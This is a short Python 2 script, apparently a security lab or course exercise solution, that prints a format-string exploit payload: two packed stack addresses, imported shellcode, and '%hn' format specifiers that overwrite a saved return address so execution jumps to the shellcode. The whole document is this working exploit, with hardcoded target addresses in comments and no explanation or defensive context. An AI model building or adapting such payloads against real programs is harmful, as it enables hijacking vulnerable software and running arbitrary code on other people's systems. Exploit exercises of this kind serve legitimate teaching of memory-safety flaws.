from struct import pack
from shellcode import shellcode

#start address: 0xbffe99e0
#return address to overwrite: 0xbffea1ec

print pack("<I",0xbffea1ec)+pack("<I",0xbffea1ee)+shellcode+"%39369x%4$hn%9750x%5$hn"
